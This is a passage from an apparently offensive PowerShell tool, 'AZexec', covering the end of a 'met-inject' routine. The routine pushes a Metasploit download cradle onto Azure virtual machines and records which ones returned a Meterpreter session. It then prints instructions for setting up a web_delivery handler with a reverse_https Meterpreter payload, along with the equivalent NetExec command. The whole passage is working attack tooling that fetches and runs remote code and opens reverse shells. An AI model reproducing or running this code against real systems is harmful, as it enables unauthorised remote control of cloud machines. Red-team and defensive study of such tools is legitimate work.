                Write-Host $targetOS.PadRight(12) -NoNewline
                Write-Host "(Meterpreter!)".PadRight(16) -ForegroundColor "Green" -NoNewline
                Write-Host "${SRVHOST}:${SRVPORT}" -ForegroundColor "White"

                Write-ColorOutput -Message "    [+] Cradle deployed in $([Math]::Round($duration, 2))s" -Color "Green"
                $successfulExec++

                $exportData += [PSCustomObject]@{
                    Subscription = $target.Subscription
                    TargetName = $targetName
                    ResourceGroup = $targetRG
                    OSType = $targetOS
                    Method = $targetMethod
                    Handler = "${SRVHOST}:${SRVPORT}"
                    RAND = $RAND
                    Status = "Success"
                    Duration = $duration
                    Timestamp = $startTime.ToString("yyyy-MM-dd HH:mm:ss")
                }

            } catch {
                Write-Host ""
                Write-Host "AZR".PadRight(8) -ForegroundColor "Magenta" -NoNewline
                Write-Host $targetName.Substring(0, [Math]::Min(20, $targetName.Length)).PadRight(22) -NoNewline
                Write-Host "443".PadRight(7) -NoNewline
                Write-Host $targetOS.PadRight(12) -NoNewline
                Write-Host "(Failed!)".PadRight(12) -ForegroundColor "Red" -NoNewline
                Write-Host "" -ForegroundColor "White"

                Write-ColorOutput -Message "    [!] Execution failed: $($_.Exception.Message)" -Color "Red"
                $failedExec++

                $exportData += [PSCustomObject]@{
                    Subscription = $target.Subscription
                    TargetName = $targetName
                    ResourceGroup = $targetRG
                    OSType = $targetOS
                    Method = $targetMethod
                    Handler = "${SRVHOST}:${SRVPORT}"
                    RAND = $RAND
                    Status = "Failed"
                    Error = $_.Exception.Message
                    Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                }
            }
        }
    }

    # ============================================
    # SUMMARY
    # ============================================
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] METASPLOIT INJECTION SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    Write-ColorOutput -Message "[*] Handler: ${SRVHOST}:${SRVPORT}" -Color "White"
    Write-ColorOutput -Message "[*] Total Targets: $totalTargets" -Color "White"
    Write-ColorOutput -Message "[*] Successful: $successfulExec" -Color "Green"
    Write-ColorOutput -Message "[*] Failed: $failedExec" -Color $(if ($failedExec -gt 0) { "Red" } else { "Green" })

    Write-ColorOutput -Message "`n[*] NETEXEC COMPARISON:" -Color "Yellow"
    Write-ColorOutput -Message "    NetExec: nxc smb <target> -M met_inject -o SRVHOST=$SRVHOST SRVPORT=$SRVPORT RAND=$RAND" -Color "Gray"
    Write-ColorOutput -Message "    AZexec:  .\azx.ps1 met-inject -SRVHOST $SRVHOST -SRVPORT $SRVPORT -RAND $RAND -VMName <vm>" -Color "Gray"

    Write-ColorOutput -Message "`n[*] METASPLOIT HANDLER SETUP:" -Color "Yellow"
    Write-ColorOutput -Message "    use exploit/multi/script/web_delivery" -Color "Gray"
    Write-ColorOutput -Message "    set target 2                    # PSH" -Color "Gray"
    Write-ColorOutput -Message "    set payload windows/x64/meterpreter/reverse_https" -Color "Gray"
    Write-ColorOutput -Message "    set SRVHOST $SRVHOST" -Color "Gray"
    Write-ColorOutput -Message "    set SRVPORT $SRVPORT" -Color "Gray"
    Write-ColorOutput -Message "    set URIPATH $RAND" -Color "Gray"
    Write-ColorOutput -Message "    run" -Color "Gray"

    # Export results
    if ($ExportPath -and $exportData.Count -gt 0) {
        $stats = @{
            "Total Targets" = $totalTargets
            "Successful" = $successfulExec
            "Failed" = $failedExec
            "Handler" = "${SRVHOST}:${SRVPORT}"
        }
        Export-EnumerationResults -Data $exportData -ExportPath $ExportPath -Title "Metasploit Injection Results" -Statistics $stats -CommandName "met-inject" -Description "Azure Metasploit payload deployment results. Equivalent to NetExec -M met_inject."
    }

    return $exportData
}
